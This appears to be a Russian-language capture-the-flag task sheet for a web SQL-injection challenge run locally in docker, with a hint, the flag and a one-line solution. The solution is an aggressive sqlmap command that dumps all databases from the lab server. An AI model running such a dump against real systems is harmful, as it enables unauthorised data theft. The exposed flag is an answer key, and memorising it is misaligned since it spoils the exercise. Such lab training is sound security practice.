# Название: 
think as admin 2

# Категория: 
web

# Сообщение: 
Боб оставил записку на тот случай если у нас ничего не получится

# Флаг: 
yetiCTF{sq1map_1s_super_t00l}

# Решение: 
sqlmap -u http://192.168.1.40:5200/ --data "username=123&password=123" --level=5 --risk=3 --dump-all

# Запуск:
```
	docker build -t sql ./
	docker run -p 5200:5200 sql
```
